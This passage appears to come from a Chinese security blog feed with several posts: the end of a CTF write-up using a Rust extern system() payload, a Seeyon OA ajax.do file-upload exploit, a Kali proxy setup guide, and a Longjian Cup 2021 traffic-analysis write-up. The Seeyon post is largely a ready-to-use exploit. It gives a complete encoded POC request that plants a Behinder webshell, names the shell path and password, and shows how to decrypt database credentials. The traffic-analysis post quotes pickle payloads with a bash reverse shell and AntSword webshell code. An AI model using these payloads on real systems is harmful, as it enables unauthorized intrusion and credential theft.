class="line">    &#125;  </span><br><span class="line">    fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(output) = Command::<span class="title function_ invoke__">new</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">output</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span> !output.status.<span class="title function_ invoke__">success</span>()&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(output.stderr.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(output.stdout.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">default</span>();  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[launch]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">rocket</span>() <span class="punctuation">-&gt;</span> _ &#123;  </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">figment</span> = rocket::Config::<span class="title function_ invoke__">figment</span>()  </span><br><span class="line">        .<span class="title function_ invoke__">merge</span>((<span class="string">&quot;address&quot;</span>, <span class="string">&quot;0.0.0.0&quot;</span>));  </span><br><span class="line">    rocket::<span class="title function_ invoke__">custom</span>(figment).<span class="title function_ invoke__">mount</span>(<span class="string">&quot;/&quot;</span>, routes![])  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意<code>/rust_code</code>路由下，过滤了<code>std</code>表示禁止使用Rust的标准库。生成一个随机的长度为 5 的文件名，使用 <code>File::create</code> 创建一个文件，路径为 <code>playground/&#123;&#125;.rs</code>，然后运行rust代码并输出</p>
<p>我们的目标是通过system函数执行命令，但是system属于外部函数，需要我们声明一下</p>
<p>payload如下</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明外部函数 C语言库函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">system</span>(cmd: *<span class="keyword">const</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">	<span class="comment">// Rust 中的 unsafe 块，用于执行不受 Rust 安全机制保护的操作</span></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>.<span class="title function_ invoke__">as_ptr</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者是</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">	<span class="keyword">fn</span> <span class="title function_">system</span>(s: *<span class="keyword">const</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;  </span><br><span class="line">	<span class="keyword">unsafe</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">b&quot;cat /flag&quot;</span> <span class="keyword">as</span> *<span class="keyword">const</span> <span class="type">u8</span>)</span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>致远OA-ajax.do任意文件上传漏洞</title>
    <url>/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p>利用此漏洞来连接冰蝎，可用来命令执行或者数据库连接</p>
<span id="more"></span>

<h1 id="致远OA-ajax-do任意文件上传漏洞"><a href="#致远OA-ajax-do任意文件上传漏洞" class="headerlink" title="致远OA-ajax.do任意文件上传漏洞"></a>致远OA-ajax.do任意文件上传漏洞</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote>
<p>致远OA旧版本中某些接口存在未授权访问，以及部分函数过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本，从而控制服务器</p>
</blockquote>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">致远OA V8.0</span><br><span class="line">致远OA V7.1、V7.1SP1</span><br><span class="line">致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">致远OA V6.0、V6.1SP1、V6.1SP2</span><br><span class="line">致远OA V5.x</span><br><span class="line">致远OA G6</span><br></pre></td></tr></table></figure>

<h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>首先验证漏洞是否存在，访问如下url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br></pre></td></tr></table></figure>

<p>如果出现异常页面，则漏洞可能存在</p>
<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214529204.png"></p>
<p>POC如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>

<p>如果漏洞利用成功，回显如下界面</p>
<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214707896.png"></p>
<p>利用失败的话回显如下，或者页面空白，警告等</p>
<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214945750.png"></p>
<p><strong>利用成功后用冰蝎连接</strong> <a href="https://github.com/rebeyond/Behinder/releases">工具链接</a></p>
<p>webshell路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/SeeyonUpdate1.jspx</span><br></pre></td></tr></table></figure>

<p>连接密码：rebeyond</p>
<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412215119512.png"></p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>连接上马后即可命令执行，同样我们可以进行数据库连接从而实现敏感信息泄露</p>
<p>当然前提是知道连接数据库的密码 <a href="https://www.cmdhack.com/archives/212.html">参考文章</a></p>
<p>致远OA数据库配置文件路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/Seeyon/A8/base/conf/datasourceCtp.properties</span><br></pre></td></tr></table></figure>

<p>访问可以找到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.backup.path=</span><br><span class="line">db.hibernateDialect=org.hibernate.dialect.SQLServerDialect</span><br><span class="line">ctpDataSource.username=sa</span><br><span class="line">workflow.dialect=SQLServer</span><br><span class="line">ctpDataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver</span><br><span class="line">ctpDataSource.password=/1.0/UWJ0dHgxc2U=</span><br><span class="line">ctpDataSource.url=jdbc:sqlserver://127.0.0.1:1433;DatabaseName=seeyou2;maxStatements=0;SelectMethod=cursor</span><br><span class="line">mysql.path=</span><br><span class="line">ctpDataSource.maxCount=2000</span><br></pre></td></tr></table></figure>

<p>不过这里的密码是经过加密的，<code>1.0</code>表示左偏移一位，对应解密成明文</p>
<p>解密脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a=&quot;&quot;</span><br><span class="line">password = &quot;Ab123456&quot;</span><br><span class="line">for i in password:</span><br><span class="line">    a+= chr(ord(i) -1 )</span><br><span class="line"></span><br><span class="line">print a</span><br></pre></td></tr></table></figure>

<p>得到密码后即可连接数据库造成敏感信息泄露</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>记录kali如何挂梯子</title>
    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html</url>
    <content><![CDATA[<p>记录下kali如何挂梯子</p>
<span id="more"></span>



<p><strong>前言</strong></p>
<blockquote>
<p>网上关于Linux挂梯子的教程有挺多的，不过一开始按照参考文章都不行（搁置了好久）。现在有时间来弄结果成功了，特此记录下</p>
</blockquote>
<p><strong>步骤</strong></p>
<p>我们先创建clash目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir clash</span><br></pre></td></tr></table></figure>

<p>然后我们下载压缩包文件，选择第一个</p>
<p>链接：<a href="https://archive.org/download/clash_for_windows_pkg">https://archive.org/download/clash_for_windows_pkg</a></p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425211553427.png"></p>
<p>解压后进入目录<code>Clash for Windows-0.20.39-x64-linux</code>，试试执行下程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cfw</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212131108.png"></p>
<p>成功打开后，我们可以汉化一下</p>
<p>访问<code>https://github.com/Z-Siqi/Clash-for-Windows_Chinese</code>，点击release后下载app.asar文件</p>
<p>然后替换<code>/clash/Clash for Windows-0.20.39-x64-linux/resources/</code>目录下的同名文件，重新启动即可</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212641961.png"></p>
<p>然后就是导入配置文件，我这里是直接在物理机下载下来配置文件然后导入</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212813415.png"></p>
<p>最后就是设置浏览器代理</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212844360.png"></p>
<p>设置好后，就能成功使用魔法访问外网</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212931593.png"></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>陇剑杯2021</title>
    <url>/article/%E9%99%87%E5%89%91%E6%9D%AF2021.html</url>
    <content><![CDATA[<p>记录陇剑杯的流量分析题</p>
<span id="more"></span>



<h1 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h1><h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>网络存在源码泄漏，源码文件名是什么</strong></p>
<p>web手都知道的<code>www.zip</code></p>
<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，文件名为什么</strong></p>
<p>直接搜索<code>/tmp</code>找到写的文件，url解码一下文件名为<code>sess_car</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>分析攻击流量，黑客使用的是什么类读取了秘密文件。</strong></p>
<p>前一问已经知道利用的是<code>SplFileObject</code>原生类读取文件</p>
<h1 id="简单日志分析"><a href="#简单日志分析" class="headerlink" title="简单日志分析"></a>简单日志分析</h1><h2 id="Task1-1"><a href="#Task1-1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客攻击的参数是什么</strong></p>
<p>打开日志文件看，很明显只有user参数，解码一下发现是pickle反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;whoami&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>



<h2 id="Task2-1"><a href="#Task2-1" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客查看的秘密文件的绝对路径是什么</strong></p>
<p>往后看user参数值解码一下就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;cat /Th4s_IS_VERY_Import_Fi1e&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>

<h2 id="Task3-1"><a href="#Task3-1" class="headerlink" title="Task3"></a>Task3</h2><p><strong>黑客反弹shell的ip和端口是什么</strong></p>
<p>先url解码然后再base64解码即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.197/8888 0&gt;&amp;1&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>



<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="Task1-2"><a href="#Task1-2" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客登录系统使用的密码是什么</strong></p>
<p>追踪tcp流，在第六个流找到密码<code>Admin123@#</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417174942408.png"></p>
<h2 id="Task2-2"><a href="#Task2-2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客修改了一个日志文件，文件的绝对路径为什么</strong></p>
<p>在第26个流找到引用<code>21_08_07.log</code>日志文件并命令执行，则该文件被植入木马</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417175333064.png"></p>
<p>文件的绝对路径为<code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code></p>
<h2 id="Task3-2"><a href="#Task3-2" class="headerlink" title="Task3"></a>Task3</h2><p><strong>黑客获取webshell之后，权限是是什么</strong></p>
<p>我们利用语法，搜索http请求中包含<code>whoami</code>命令执行的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p>找到24和28流，其中28流的200响应包中找到用户权限为<code>www-data</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417181946403.png"></p>
<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>黑客写入的webshell文件名是什么</strong></p>
<p>在第33个流找到写入木马的命令，文件名为<code>1.php</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417182628708.png"></p>
<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>黑客上传的代理工具客户端名字是什么</strong></p>
<p>因为我们知道写马到1.php，我们筛选一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;1.php&quot;</span><br></pre></td></tr></table></figure>

<p>然后一个个看，在第39个流追踪http流，发现代理工具<code>frpc.ini</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240418193436502.png"></p>
<p>我们分析一下是如何回显上述列表的，将发包数据解码并美化一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaa=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">	return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	echo &quot;693&quot;.&quot;d434&quot;;</span><br><span class="line">	echo @asenc($output);</span><br><span class="line">	echo &quot;a3&quot;.&quot;7cb&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">	$D=base64_decode(substr($_POST[&quot;j68071301598f&quot;],2));</span><br><span class="line">	$F=@opendir($D);</span><br><span class="line">	if($F==NULL) &#123;</span><br><span class="line">		echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$M=NULL;</span><br><span class="line">		$L=NULL;</span><br><span class="line">		while($N=@readdir($F)) &#123;</span><br><span class="line">			$P=$D.$N;</span><br><span class="line">			$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));</span><br><span class="line">			@$E=substr(base_convert(@fileperms($P),10,8),-4);</span><br><span class="line">			$R=&quot;	&quot;.$T.&quot;	&quot;.@filesize($P).&quot;	&quot;.$E.&quot;</span><br><span class="line">&quot;;</span><br><span class="line">			if(@is_dir($P))$M.=$N.&quot;/&quot;.$R; else $L.=$N.$R;</span><br><span class="line">		&#125;</span><br><span class="line">		echo $M.$L;</span><br><span class="line">		@closedir($F);</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">	echo &quot;ERROR://&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br><span class="line">&amp;j68071301598f=hML3Zhci93d3cvaHRtbC8=</span><br></pre></td></tr></table></figure>

<p>我们重点看下面函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function asoutput() &#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	echo &quot;693&quot;.&quot;d434&quot;;</span><br><span class="line">	echo @asenc($output);</span><br><span class="line">	echo &quot;a3&quot;.&quot;7cb&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由回显内容可以知道<code>@asenc($output)</code>就是输出的列表，而<code>$output</code>是调用<code>ob_get_contents()</code>，它用于获取当前输出缓冲区的内容并返回。 然后看向try的过程，发现POST参数从第二位开始截取并解码，结果为<code>/var/www/html</code>，那么应该就是读取该路径下的文件。</p>
<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>黑客代理工具的回连服务端IP是什么</strong></p>
<p>追踪tcp流，在第38个流找到hex加密数据，解码得到ip为<code>192.168.239.123</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.239.123</span><br><span class="line">server_port = 7778</span><br><span class="line">token=Xa3BJf2l5enmN6Z7A8mv</span><br><span class="line"></span><br><span class="line">[test_sock5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port =8111</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = 0HDFt16cLQJ</span><br><span class="line">plugin_passwd = JTN276Gp</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>

